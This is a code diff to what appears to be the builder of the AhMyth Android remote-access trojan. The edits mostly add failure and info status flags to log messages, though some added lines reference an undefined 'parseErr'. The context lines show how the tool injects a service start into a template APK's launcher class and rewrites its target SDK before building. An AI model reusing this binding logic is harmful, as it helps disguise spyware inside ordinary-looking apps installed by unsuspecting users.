@@ -530,7 +530,7 @@ app.controller("AppCtrl", ($scope) => {
       explicitArray: false
     }, (err, result) => {
       if (err) {
-        callback('[¡] Failed to Parse the Android Manifest Data!', CONSTANTS.logStatus.FAIL);
+        callback('[x] Failed to Parse the Android Manifest Data!', CONSTANTS.logStatus.FAIL);
         WriteErrorLog(parseError, 'Parsing');
         delayedLog('[¡] Error written to "Parsing.log" on...', CONSTANTS.logStatus.INFO);
         return;
@@ -640,6 +640,8 @@ app.controller("AppCtrl", ($scope) => {
         parser.parseString(updatedData, (parseErr, result) => {
           if (parseErr) {
             console.error('[x] Unable to Parse the Modified Android Manifest XML!', CONSTANTS.logStatus.FAIL);
+            WriteErrorLog(parseErr, 'Parsing');
+            delayedLog('[¡] Error written to "Parsing.log" on...', CONSTANTS.logStatus.INFO);
             return;
           }
 
@@ -715,7 +717,7 @@ app.controller("AppCtrl", ($scope) => {
     delayedLog('[★] Reading the Android Manifest File...');
     fs.readFile(manifestPath, 'utf8', (error, data) => {
       if (error) {
-        delayedLog('[x] Reading the Android Manifest File Failed!');
+        delayedLog('[x] Reading the Android Manifest File Failed!', CONSTANTS.logStatus.FAIL);
         return;
       }
 
@@ -732,7 +734,9 @@ app.controller("AppCtrl", ($scope) => {
         delayedLog('[★] Parsing the Modified Android Manifest Data...')
         parser.parseString(updatedData, (parseErr, result) => {
           if (parseErr) {
-            delayedLog('[x] Unable to Parse the Modified Android Manifest XML!');
+            delayedLog('[x] Unable to Parse the Modified Android Manifest XML!', CONSTANTS.logStatus.FAIL);
+            WriteErrorLog(parseErr, 'Parsing');
+            delayedLog('[¡] Error written to "Parsing.log" on...', CONSTANTS.logStatus.INFO);
             return;
           }
 
@@ -799,37 +803,39 @@ app.controller("AppCtrl", ($scope) => {
 
             fs.readFile(dir.join(apkFolder, 'AndroidManifest.xml'), 'utf8', (error, data) => {
               if (error) {
-                delayedLog('[x] Reading the Manifest File Failed!');
+                delayedLog('[x] Reading the Manifest File Failed!', CONSTANTS.logStatus.FAIL);
                 return;
               }
 
               xml2js.parseString(data, (err, result) => {
                 if (err) {
-                  delayedLog('[x] ' + err);
+                  delayedLog('[x] Unable to Parse the Modified Android Manifest XML!', CONSTANTS.logStatus.FAIL);
+                  WriteErrorLog(parseErr, 'Parsing');
+                  delayedLog('[¡] Error written to "Parsing.log" on...', CONSTANTS.logStatus.INFO);
                   return;
                 }
 
                 const launcherActivity = GetLauncherActivity(result, apkFolder);
                 if (launcherActivity === -1) {
-                  delayedLog('[x] Cannot Find a Suitable Class for Hooking in the Manifest!');
-                  delayedLog('[x] Please use Another APK as a Template!.');
+                  delayedLog('[x] Cannot Find a Suitable Class for Hooking in the Manifest!', CONSTANTS.logStatus.FAIL);
+                  delayedLog('[x] Please use Another APK as a Template!.', CONSTANTS.logStatus.FAIL);
                   return;
                 }
 
                 delayedLog('[★] Locating the Hookable Main Class File...');
                 const launcherPath = GetLauncherPath(launcherActivity, apkFolder, (err, launcherPath) => {
                   if (err) {
-                    delayedLog('[x] Unable to Locate the Hookable Main Class File!');
-                    delayedLog('[x] Please Use the "On Boot" Method!');
+                    delayedLog('[x] Unable to Locate the Hookable Main Class File!', CONSTANTS.logStatus.FAIL);
+                    delayedLog('[x] Please Use the "On Boot" Method!', CONSTANTS.logStatus.FAIL);
                     return;
                   } else {
-                    delayedLog('[¡] Hookable Main Class File Found: ' + launcherPath);
+                    delayedLog('[¡] Hookable Main Class File Found: ' + launcherPath, CONSTANTS.logStatus.INFO);
                   }
 
                   delayedLog('[★] Reading the Hookable Main Class File...');
                   fs.readFile(dir.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                     if (error) {
-                      delayedLog('[x] Unable to Read the Hookable Main Class File!');
+                      delayedLog('[x] Unable to Read the Hookable Main Class File!', CONSTANTS.logStatus.FAIL);
                       return;
                     }
 
@@ -841,14 +847,14 @@ app.controller("AppCtrl", ($scope) => {
                     var output = data.replace(hook, startService);
                     fs.writeFile(dir.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                       if (error) {
-                        delayedLog('[x] Modifying the Hookable Main Class File Failed!');
+                        delayedLog('[x] Modifying the Hookable Main Class File Failed!', CONSTANTS.logStatus.FAIL);
                         return;
                       }
 
                       delayedLog('[★] Determining Target SDK Version...');
                       fs.readFile(dir.join(apkFolder, 'AndroidManifest.xml'), 'utf8', (error, data) => {
                         if (error) {
-                          delayedLog('[x] Reading the Manifest Target SDK Failed.');
+                          delayedLog('[x] Reading the Manifest Target SDK Failed.', CONSTANTS.logStatus.FAIL);
                           return;
                         }
 
@@ -866,13 +872,13 @@ app.controller("AppCtrl", ($scope) => {
 
                         fs.writeFile(dir.join(apkFolder, 'AndroidManifest.xml'), repXmlSdk, 'utf8', (error) => {
                           if (error) {
-                            delayedLog('[x] Modifying Manifest Target SDK Failed!');
+                            delayedLog('[x] Modifying Manifest Target SDK Failed!', CONSTANTS.logStatus.FAIL);
                             return;
                           }
 
                           fs.readFile(dir.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                             if (error) {
-                              delayedLog("[x] Reading the 'apktool.yml' Target SDK Failed!");
+                              delayedLog("[x] Reading the 'apktool.yml' Target SDK Failed!", CONSTANTS.logStatus.FAIL);
                               return;
                             }
 
@@ -884,7 +890,7 @@ app.controller("AppCtrl", ($scope) => {
 
                             fs.writeFile(dir.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
                               if (error) {
-                                delayedLog("[x] Modifying the 'apktool.yml' Target SDK Failed!");
+                                delayedLog("[x] Modifying the 'apktool.yml' Target SDK Failed!", CONSTANTS.logStatus.FAIL);
                                 return;
                               }
                               $appCtrl.CopyAhmythFilesAndGenerateApk(apkFolder);
